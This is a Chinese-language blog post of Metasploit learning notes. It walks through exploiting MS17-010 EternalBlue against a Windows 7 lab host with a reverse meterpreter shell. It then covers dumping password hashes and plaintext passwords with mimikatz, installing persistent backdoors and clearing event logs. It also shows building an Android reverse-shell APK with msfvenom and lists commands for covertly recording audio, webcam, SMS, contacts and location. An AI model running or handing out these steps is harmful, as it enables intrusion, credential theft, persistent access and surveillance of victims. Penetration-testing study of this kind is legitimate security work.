---
title: Metasploit学习-1
date: 2018-03-14 21:17:37
categories: 安全
tags: [Metasploit,工具]

---



## Metasploit 介绍

Metasploit是一个漏洞利用框架，全称The Metasploit Framework，简称MSF。 
msf包括各种模块，插件，和第三方工具。如msfvenom，db_nmap，db_sqlmap等。其中模块分为辅助模块（Aux）、渗透攻击模块（Exploits）、后渗透攻击模块（Post）、攻击载荷模块（Payloads）、空指令模块（Nops）和编码器模块（Encoders)等。
这里主要记录下关于msf的使用。
<!--more-->

## MSF常用命令

首先输入`msfdb init` 初始化数据库，然后输入`msfconsole`进入msf交互式命令行进行操作。
msf的常用命令如下：

```
help：查看帮助信息
show exploits：查看所有 exploit
show payloads：查看所有 payload
show auxiliary：查看所有 auxiliary
banner：查看版本信息 
search：搜索相关模块
use：使用模块
show options：查看模块参数
set：设置模块参数信息
info：查看模块更多信息
exploit：执行攻击 -j 后台执行 -z 成功后不立即打开session
makerc：将历史命令输出到文件中
back：use命令后退出模块
```





## MSF渗透Window

关于信息的收集和漏洞发现可以使用namp和nessus等工具。当发现系统漏洞后，就可以使用msf进行攻击了。
一般的流程为先确定攻击模块，设置目标参数，再设置攻击载荷，最后执行exploit。这里以ms17-010为例。
先搜索漏洞利用模块

```
msf > search ms17-010
Matching Modules
================
   Name                                      Disclosure Date  Rank     Description
   ----                                      ---------------  ----     -----------
   auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   auxiliary/scanner/smb/smb_ms17_010                         normal   MS17-010 SMB RCE Detection
   exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```

搜索到有漏洞扫描模块和漏洞利用模块，这里使用auxiliary/scanner/smb/smb_ms17_010作为漏洞扫描模块，exploit/windows/smb/ms17_010_eternalblue作为漏洞攻击模块。
先探测下漏洞是否存在

```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.222.128
set RPORT 445
exploit
```
如果显示如下结果则表明漏洞存在，可以利用

```
[+] 192.168.222.128:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


接下来使用漏洞攻击模块

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.222.128
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.222.1
exploit
```

执行成功后会返回一个回话，可以进行后续的各种操作。
![Meterpreter](http://7xo8y2.com1.z0.glb.clouddn.com/18-3-10/29467741.jpg)

也可以将以上要执行的命令写入脚本，然后使用`msfconsole -r xxx.rc`或者在msfconsole中使用`resource xxx.rc`来快速执行命令。

## Meterpreter

当对目标攻击成功时，会反弹回来一个会话，此时可以操纵目标电脑来进行更深入的攻击。

### 常用命令

```
sysinfo：查看系统信息
ps：列出进程
migrate pid：进程转移,将连接进程转移到稳定的进程上
getsystem：获取system权限
shell：运行shell
screenhost：截屏
cat：查看某文件内容
gwtwd：回获取当前工作目录
upload file：上传文件，需要注意windows路径
download file：下载文件
portfwd：端口转发工具
keyscan_start：开始键盘记录
keyscan_dump：打印键盘记录
keyscan_stop：停止键盘记
eexecute：执行文件
hashdump：列出用户hash
run vnc：可以看到对方桌面
background：将当前session转入后台
sessions：列出所有会话
sessions -i 会话id：进入某个session中
clearev：清除日志记录
```

### Windows获取用户密码

1. 获取hash，然后使用一些在线破解网站进行破解
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
hp:1000:aad3b435b51404eeaad3b435b51404ee:3008c87294511142799dca1191e69a0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
   也可以使用smart_hashdump，命令`run post/windows/gather/smart_hashdump `。
   ![hash破解](http://7xo8y2.com1.z0.glb.clouddn.com/18-3-10/19783055.jpg)

2. 使用mimikatz得到明文密码。
   ```
   load mimikatz: 加载mimikatz
   kerberos：获取明文密码，也可以使用命令wdigest
   ```
   ![明文密码](http://7xo8y2.com1.z0.glb.clouddn.com/18-3-10/48844437.jpg)

### 端口转发

```
portfwd add -l 8080 -r 192.168.222.128 -p 80 
将目标机的80端口映射到本地80端口。
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
    -L <opt>  本地主机ip
    -R        反向端口转发。
    -l <opt>  本地监听端口
    -p <opt>  远程目标机器端口
    -r <opt>  远程目标机器ip
```



### 后门维持

1. 使用persistence 命令

   ```
   run persistence -A -U -i 5 -p rport-r rhost 
   -S可创建服务 
   -U 会在HKCU添加启动项，-X 会在HKLM添加启动项 
   -i：设置反向连接间隔时间，单位为秒。当设置该参数后，目标机器会每隔设置的时间回连一次所设置的ip； 
   -p：设置监听端口。 
   -r：设置监听ip。 
   ```

2. 使用metsvc 

   ```
   run metsvc -A 
   使用此命令会自动安装metsrv服务到目标机上。
   使用payload为windows/metsvc_bind_tcp进行连接。 
   ```

   ​

## MSF攻击Android

msf可以生成android的后门程序来攻击安卓手机，具体使用如下。
首先生成后门程序。

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=8082 > hack.apk
```

然后安装到测试手机上。之后使用监听脚本，当启动后门程序时就会反弹回来shell。

```
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.0.10
set LPORT 8082
exploit

```

meterpreter 会话中安卓常用的命令如下：

```
help：查看所有命令
record_mic：记录来自默认麦克风的音频X秒
webcam_chat：开始视频聊天
webcam_list：列出设备上的摄像头
webcam_snap：从指定的摄像头拍摄照片
webcam_stream：监控摄像头
activity_start：启动其它应用
check_root：检查设备是否root
dump_calllog：获取通话记录
dump_contacts：获取联系人列表
dump_sms：获取短信
geolocate：使用geolocation获取当前地理位置
hide_app_icon：隐藏应用图标
send_sms：使用目标设备发送短信
wlan_geolocate：使用WLAN信息获取当前地理位置
```



### 参考

[Metasploit学习笔记](https://www.cnblogs.com/zlslch/p/6875397.html)

[Meterpreter命令速查表](http://www.cnnetsec.com/1368.html)

[安全科普：详解Windows Hash与破解](http://www.freebuf.com/articles/database/70395.html)
